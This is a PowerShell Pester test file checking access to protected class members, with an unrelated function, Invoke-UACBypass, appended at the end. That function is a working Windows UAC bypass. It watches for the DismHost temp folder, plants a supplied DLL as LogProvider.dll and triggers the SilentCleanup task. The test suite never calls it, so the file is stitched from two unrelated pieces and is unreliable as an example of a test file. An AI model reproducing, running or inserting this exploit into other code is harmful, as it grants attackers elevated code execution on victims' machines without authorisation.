


Add-Type -WarningAction Ignore @'
public class Base
{
    private int data;

    protected Base()
    {
        data = 10;
    }

    protected Base(int i)
    {
        data = i;
    }

    protected int Field;
    protected int Property { get; set; }
    public int Property1 { get; protected set; }
    public int Property2 { protected get; set; }

    protected int Method()
    {
        return 32 + data;
    }
    protected int OverloadedMethod1(int i)
    {
        return 32 + i + data;
    }
    protected int OverloadedMethod1(string i)
    {
        return 1 + data;
    }
    public int OverloadedMethod2(int i)
    {
        return 32 + i + data;
    }
    protected int OverloadedMethod2(string i)
    {
        return 1 + data;
    }
    protected int OverloadedMethod3(int i)
    {
        return 32 + i + data;
    }
    public int OverloadedMethod3(string i)
    {
        return 1 + data;
    }
}
'@

$derived1,$derived2,$derived3 = Invoke-Expression @'
class Derived : Base
{
    Derived() : Base() {}
    Derived([int] $i) : Base($i) {}

    [int] TestPropertyAccess()
    {
        $this.Property = 1111
        return $this.Property
    }

    [int] TestPropertyAccess1()
    {
        $this.Property1 = 2111
        return $this.Property1
    }

    [int] TestPropertyAccess2()
    {
        $this.Property2 = 3111
        return $this.Property2
    }

    [int] TestDynamicPropertyAccess()
    {
        $p = 'Property'
        $this.$p = 1112
        return $this.$p
    }

    [int] TestFieldAccess()
    {
        $this.Field = 11
        return $this.Field
    }

    [int] TestDynamicFieldAccess()
    {
        $f = 'Field'
        $this.$f = 12
        return $this.$f
    }

    [int] TestMethodAccess()
    {
        return $this.Method()
    }

    [int] TestDynamicMethodAccess()
    {
        $m = 'Method'
        return $this.$m()
    }

    [int] TestOverloadedMethodAccess1a()
    {
        return $this.OverloadedMethod1(42)
    }
    [int] TestOverloadedMethodAccess1b()
    {
        return $this.OverloadedMethod1("abc")
    }
    [int] TestOverloadedMethodAccess2a()
    {
        return $this.OverloadedMethod2(42)
    }
    [int] TestOverloadedMethodAccess2b()
    {
        return $this.OverloadedMethod2("abc")
    }
    [int] TestOverloadedMethodAccess3a()
    {
        return $this.OverloadedMethod3(42)
    }
    [int] TestOverloadedMethodAccess3b()
    {
        return $this.OverloadedMethod3("abc")
    }
}

class Derived2 : Base {}

[Derived]::new()
[Derived]::new(20)
[Derived2]::new()
'@

Describe "Protected Member Access - w/ default ctor" -Tags "CI" {
    It "Method Access" { $derived1.TestMethodAccess() | Should -Be 42 }
    It "Dynamic Method Access" { $derived1.TestDynamicMethodAccess() | Should -Be 42 }
    It "Field Access" { $derived1.TestFieldAccess() | Should -Be 11 }
    It "Dynamic Field Access" { $derived1.TestDynamicFieldAccess() | Should -Be 12 }
    It "Property Access - protected get/protected set" { $derived1.TestPropertyAccess() | Should -Be 1111 }
    It "Property Access - public get/protected set " { $derived1.TestPropertyAccess1() | Should -Be 2111 }
    It "Property Access - protected get/public set" { $derived1.TestPropertyAccess2() | Should -Be 3111 }
    It "Dynamic Property Access" { $derived1.TestDynamicPropertyAccess() | Should -Be 1112 }

    It "Method Access - overloaded 1a" { $derived1.TestOverloadedMethodAccess1a() | Should -Be 84 }
    It "Method Access - overloaded 1b" { $derived1.TestOverloadedMethodAccess1b() | Should -Be 11 }
    It "Method Access - overloaded 2a" { $derived1.TestOverloadedMethodAccess2a() | Should -Be 84 }
    It "Method Access - overloaded 2b" { $derived1.TestOverloadedMethodAccess2b() | Should -Be 11 }
    It "Method Access - overloaded 3a" { $derived1.TestOverloadedMethodAccess3a() | Should -Be 84 }
    It "Method Access - overloaded 3b" { $derived1.TestOverloadedMethodAccess3b() | Should -Be 11 }
    It "Implicit ctor calls protected ctor" { $derived3.OverloadedMethod2(42) | Should -Be 84 }
}

Describe "Protected Member Access - w/ non-default ctor" -Tags "CI" {
    It "Method Access" { $derived2.TestMethodAccess() | Should -Be 52 }
    It "Dynamic Method Access" { $derived2.TestDynamicMethodAccess() | Should -Be 52 }
    It "Field Access" { $derived2.TestFieldAccess() | Should -Be 11 }
    It "Dynamic Field Access" { $derived2.TestDynamicFieldAccess() | Should -Be 12 }
    It "Property Access - protected get/protected set" { $derived1.TestPropertyAccess() | Should -Be 1111 }
    It "Property Access - public get/protected set " { $derived1.TestPropertyAccess1() | Should -Be 2111 }
    It "Property Access - protected get/public set" { $derived1.TestPropertyAccess2() | Should -Be 3111 }
    It "Dynamic Property Access" { $derived2.TestDynamicPropertyAccess() | Should -Be 1112 }

    It "Method Access - overloaded 1a" { $derived2.TestOverloadedMethodAccess1a() | Should -Be 94 }
    It "Method Access - overloaded 1b" { $derived2.TestOverloadedMethodAccess1b() | Should -Be 21 }
    It "Method Access - overloaded 2a" { $derived2.TestOverloadedMethodAccess2a() | Should -Be 94 }
    It "Method Access - overloaded 2b" { $derived2.TestOverloadedMethodAccess2b() | Should -Be 21 }
    It "Method Access - overloaded 3a" { $derived2.TestOverloadedMethodAccess3a() | Should -Be 94 }
    It "Method Access - overloaded 3b" { $derived2.TestOverloadedMethodAccess3b() | Should -Be 21 }
}

Describe "Protected Member Access - members not visible outside class" -Tags "CI" {
    Set-StrictMode -v 3
    It "Invalid protected field Get Access" { { $derived1.Field } | Should -Throw -ErrorId "PropertyNotFoundStrict" }
    It "Invalid protected property Get Access" { { $derived1.Property } | Should -Throw -ErrorId "PropertyNotFoundStrict" }
    It "Invalid protected field Set Access" { { $derived1.Field = 1 } | Should -Throw -ErrorId "PropertyAssignmentException"}
    It "Invalid protected property Set Access" { { $derived1.Property = 1 } | Should -Throw -ErrorId "PropertyAssignmentException" }

    It "Invalid protected constructor Access" { { [Base]::new() } | Should -Throw -ErrorId "MethodCountCouldNotFindBest" }
    It "Invalid protected method Access" { { $derived1.Method() } | Should -Throw -ErrorId "MethodNotFound" }
}

function Invoke-UACBypass {


    [CmdletBinding()]
    [OutputType([System.IO.FileInfo])]
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateScript({ Test-Path $_ })]
        $DllPath
    )

    $PrivescAction = {
        $ReplacementDllPath = $Event.MessageData.DllPath
        
        $DismHostFolder = $EventArgs.NewEvent.TargetInstance.Name
        
        $OriginalPreference = $VerbosePreference

        
        if ($Event.MessageData.VerboseSet -eq $True) {
            $VerbosePreference = 'Continue'
        }

        Write-Verbose "DismHost folder created in $DismHostFolder"
        Write-Verbose "$ReplacementDllPath to $DismHostFolder\LogProvider.dll"
            
        try {
            $FileInfo = Copy-Item -Path $ReplacementDllPath -Destination "$DismHostFolder\LogProvider.dll" -Force -PassThru -ErrorAction Stop
        } catch {
            Write-Warning "Error copying file! Message: $_"
        }

        
        $VerbosePreference = $OriginalPreference

        if ($FileInfo) {
            
            New-Event -SourceIdentifier 'DllPlantedSuccess' -MessageData $FileInfo
        }
    }

    $VerboseSet = $False
    if ($PSBoundParameters['Verbose']) { $VerboseSet = $True }

    $MessageData = New-Object -TypeName PSObject -Property @{
        DllPath = $DllPath
        VerboseSet = $VerboseSet 
                                 
    }

    $TempDrive = $Env:TEMP.Substring(0,2)

    
    
    
    
    $TempFolderCreationEvent = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA `"Win32_Directory`" AND TargetInstance.Drive = `"$TempDrive`" AND TargetInstance.Path = `"$($Env:TEMP.Substring(2).Replace('\', '\\'))\\`" AND TargetInstance.FileName LIKE `"________-____-____-____-____________`""
    
    $TempFolderWatcher = Register-WmiEvent -Query $TempFolderCreationEvent -Action $PrivescAction -MessageData $MessageData

    
    $StartInfo = New-Object Diagnostics.ProcessStartInfo
    $StartInfo.FileName = 'schtasks'
    $StartInfo.Arguments = '/Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I'
    $StartInfo.RedirectStandardError = $True
    $StartInfo.RedirectStandardOutput = $True
    $StartInfo.UseShellExecute = $False
    $Process = New-Object Diagnostics.Process
    $Process.StartInfo = $StartInfo
    $null = $Process.Start()
    $Process.WaitForExit()
    $Stdout = $Process.StandardOutput.ReadToEnd().Trim()
    $Stderr = $Process.StandardError.ReadToEnd().Trim()

    if ($Stderr) {
        Unregister-Event -SubscriptionId $TempFolderWatcher.Id
        throw "SilentCleanup task failed to execute. Error message: $Stderr"
    } else {
        if ($Stdout.Contains('is currently running')) {
            Unregister-Event -SubscriptionId $TempFolderWatcher.Id
            Write-Warning 'SilentCleanup task is already running. Please wait until the task has completed.'
        }

        Write-Verbose "SilentCleanup task executed successfully. Message: $Stdout"
    }

    $PayloadExecutedEvent = Wait-Event -SourceIdentifier 'DllPlantedSuccess' -Timeout 10

    Unregister-Event -SubscriptionId $TempFolderWatcher.Id

    if ($PayloadExecutedEvent) {
        Write-Verbose 'UAC bypass was successful!'

        
        $PayloadExecutedEvent.MessageData

        $PayloadExecutedEvent | Remove-Event
    } else {
        
        Write-Error 'UAC bypass failed. The DLL was not planted in its target.'
    }
}
